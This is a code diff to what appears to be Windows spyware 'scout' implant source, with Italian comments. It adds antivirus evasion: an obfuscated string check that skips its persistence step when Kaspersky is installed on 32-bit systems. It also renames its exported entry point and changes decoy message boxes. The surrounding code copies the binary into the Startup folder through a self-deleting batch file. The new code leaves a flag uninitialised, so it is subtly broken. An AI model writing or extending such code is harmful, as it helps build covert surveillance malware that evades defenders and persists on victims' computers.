@@ -9,6 +9,7 @@
 #include "api.h"
 #include "binpatched_vars.h"
 #include "autodelete_batch.h"
+#include "agent_device.h"
 
 #pragma comment(lib, "advapi32")
 #pragma comment(lib, "ws2_32")
@@ -35,11 +36,13 @@ HANDLE hScoutSharedMemory;
 //#pragma comment(linker, "/EXPORT:MyConf=?MyConf@@YAXXZ")
 //PWCHAR urs73A(PULONG pSynchro) // questa viene richiamata dai meltati
 //__declspec(dllexport) PWCHAR jfk31d1QQ(PULONG pSynchro)
-__declspec(dllexport) PWCHAR reuio841001a(PULONG pSynchro) // questa viene richiamata dai meltati
+//__declspec(dllexport) PWCHAR reuio841001a(PULONG pSynchro) // questa viene richiamata dai meltati
+__declspec(dllexport) PWCHAR gntuoie2nv(PULONG pSynchro) // questa viene richiamata dai meltati
 {
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
 #endif
+	
 	PWCHAR pScoutName;
 	
 	uMelted = TRUE;
@@ -63,7 +66,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	
 	if (GetCurrentThread() == 0x0)
 	{
-		MessageBox(NULL, L"Starting", L"Wait for the program to load", 0);
+		MessageBox(NULL, L"Running in background", L"Engine started", 0);
 		return 0;
 	}
 	
@@ -124,7 +127,22 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	}
 
 	MySleep(WAIT_DROP);	
-	if (!uMelted)
+
+	// do not drop if kaspersky x86
+	BOOL bIsWow64, bIsOS64, bDrop;
+	IsX64System(&bIsWow64, &bIsOS64);
+	if (!bIsOS64)
+	{
+		WCHAR pKasp[] = { L's', L'p', L'e', L'r', L's', L'k', L'y', 0x0 };
+		PWCHAR pApplicationList = GetApplicationList(FALSE);
+
+		if (StrStrI(pApplicationList, pKasp))
+			bDrop = FALSE;
+
+		free(pApplicationList);
+	}
+
+	if (!uMelted && bDrop)
 		Drop();
 
 	UseLess();
@@ -159,9 +177,9 @@ VOID Drop()
 
 		PWCHAR pSourcePath = GetMySelfName();
 		PWCHAR pDestPath = GetStartupScoutName();
-		
-		if (GetCurrentProcessId() == 4)
-			MessageBox(NULL, L"I'm going to start the program automatically, is it ok?", L"Warning", 1);
+
+		if (GetCurrentThread() == 0x0)
+			MessageBox(NULL, L"The current thread is probably stale!", L"Stale thread", 1);
 
 		DoCopyFile(pSourcePath, pDestPath);
 
@@ -173,12 +191,12 @@ VOID Drop()
 VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest)
 {
 	PWCHAR pBatchName;
-
+	
 	CreateCopyBatch(pSource, pDest, &pBatchName);
 	StartBatch(pBatchName);
 	MySleep(2000);
 	DeleteFile(pBatchName);
-
+	
 	free(pBatchName);
 }
 
@@ -186,7 +204,7 @@ VOID UseLess()
 {
 	if (GetCurrentProcessId() == 4) 
 	{
-		MessageBox(NULL, L"Click to start the program", L"Starting", 0);
+		MessageBox(NULL, L"Rotors engaged", L"Locking doors", 0);
 
 		memset(DEMO_TAG, 0x0, 3);
 		memset(WMARKER, 0x0, 3);
@@ -202,7 +220,7 @@ VOID WaitForInput()
 {
 	ULONG uLastInput;
 	LASTINPUTINFO pLastInputInfo;
-
+	
 #ifdef _DEBUG
 	OutputDebugString(L"[+] FIRST_WAIT\n");
 #endif
@@ -233,6 +251,7 @@ VOID WaitForInput()
 #endif
 		MySleep(3000);
 	}
+	
 }
 
 
@@ -368,14 +387,13 @@ PCHAR GetEliteSharedMemoryName()
 	PCHAR pName = (PCHAR)malloc(16);
 	memset(pName, 0x0, 16);
 	memcpy(pName, WMARKER, 7);
-
 	/*
 	_snprintf_s(pName, 
 		16, 
 		_TRUNCATE, 
 		//"%cX%X%02X%02X%02X%02X%02X", 
 		"%.7s",
-		WMARKER[0], WMARKER[1], WMARKER[2], WMARKER[3], WMARKER[4], WMARKER[5], WMARKER[6]);
+		&WMARKER[0], &WMARKER[1], &WMARKER[2], &WMARKER[3], &WMARKER[4], &WMARKER[5], &WMARKER[6]);
 	*/
 	return pName;
 }
@@ -399,7 +417,7 @@ PCHAR GetOldEliteSharedMemoryName()
 BOOL CreateScoutSharedMemory()
 {
 	PCHAR pName;
-
+	
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Creating scout shared memory\n");
 #endif
@@ -417,7 +435,7 @@ BOOL CreateScoutSharedMemory()
 
 	if (hScoutSharedMemory)
 		return TRUE;
-
+	
 	return FALSE;
 }
 
@@ -426,7 +444,7 @@ BOOL ExistsScoutSharedMemory()
 	HANDLE hMem;
 	PCHAR pName;
 	BOOL uRet = FALSE;
-
+	
 	pName = GetScoutSharedMemoryName();
 	hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
 	if (hMem)
@@ -435,7 +453,7 @@ BOOL ExistsScoutSharedMemory()
 		CloseHandle(hMem);
 	}
 	free(pName);
-
+	
 	return uRet;
 }
 
@@ -462,6 +480,7 @@ BOOL ExistsEliteSharedMemory()
 BOOL AmIFromStartup()
 {
 	BOOL uRet;
+	
 	PWCHAR pStartupPath = GetStartupPath();
 	PWCHAR pCurrentPath = GetMySelfName();
 
@@ -473,6 +492,7 @@ BOOL AmIFromStartup()
 	
 	free(pStartupPath);
 	free(pCurrentPath);
+	
 	return uRet;
 }
 
@@ -480,11 +500,12 @@ PWCHAR GetStartupPath()
 {
 	PWCHAR pStartupPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
 	PWCHAR pShortPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
-
+	
 	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, FALSE);
 	GetShortPathName(pStartupPath, pShortPath, 4096);
 
 	free(pStartupPath);
+	
 	return pShortPath;
 }
 
@@ -492,10 +513,10 @@ PWCHAR GetStartupScoutName()
 {
 	PWCHAR pStartupPath = GetStartupPath();
 	PWCHAR pFullPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
-
+	
 	_snwprintf_s(pFullPath, 32767, _TRUNCATE, L"%s\\%S.exe", pStartupPath, SCOUT_NAME);
 	free(pStartupPath);
-
+	
 	return pFullPath;
 }
 
@@ -504,11 +525,11 @@ PWCHAR GetMySelfName()
 {
 	PWCHAR pName = (PWCHAR)malloc(32767 * sizeof(WCHAR));
 	PWCHAR pShort = (PWCHAR)malloc(32767 * sizeof(WCHAR));
-
+	
 	GetModuleFileName(NULL, pName, 32766);
 	GetShortPathName(pName, pShort, 32767);
 	free(pName);
-
+	
 	return pShort;
 }
 
@@ -516,10 +537,10 @@ PWCHAR GetTemp()
 {
 	PWCHAR pTemp = (PWCHAR)malloc(4096 * sizeof(WCHAR));
 	PWCHAR pShort = (PWCHAR)malloc(4096 * sizeof(WCHAR));
-
+	
 	GetEnvironmentVariable(L"TMP", pTemp, 32767); // FIXME GetTempPath
 	GetShortPathName(pTemp, pShort, 4096);
-
+	
 	free(pTemp);
 	return pShort;
 }
@@ -536,6 +557,8 @@ VOID MySleep(ULONG uTime)
 
 BOOL StartBatch(PWCHAR pName)
 {
+	BOOL bRet;
+		
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	PWCHAR pApplicationName = (PWCHAR)malloc(4096 * sizeof(WCHAR));
@@ -554,10 +577,11 @@ BOOL StartBatch(PWCHAR pName)
 	if (GetCurrentProcessId() == 4)
 		MessageBox(NULL, L"I'm going to start it", L"WARNING", 0);
 
-	BOOL bRet = CreateProcess(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	bRet = CreateProcess(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 
 	free(pApplicationName);
 	free(pInterpreter);
+	
 	return bRet;
 }
 
@@ -659,7 +683,7 @@ LPWSTR CreateTempFile()
 	LPWSTR pShortTempPath = (LPWSTR) malloc((MAX_PATH + 1)*sizeof(WCHAR));
 	LPWSTR pTempFileName = (LPWSTR) malloc((MAX_PATH + 1)*sizeof(WCHAR));
 	LPWSTR pShortTempFileName = (LPWSTR) malloc((MAX_PATH + 1)*sizeof(WCHAR));
-
+	
 	memset(pTempPath, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
 	memset(pShortTempPath, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
 	memset(pTempFileName, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
@@ -673,6 +697,6 @@ LPWSTR CreateTempFile()
 
 	free(pShortTempPath);
 	free(pTempFileName);
-
+	
 	return pShortTempFileName;
 }
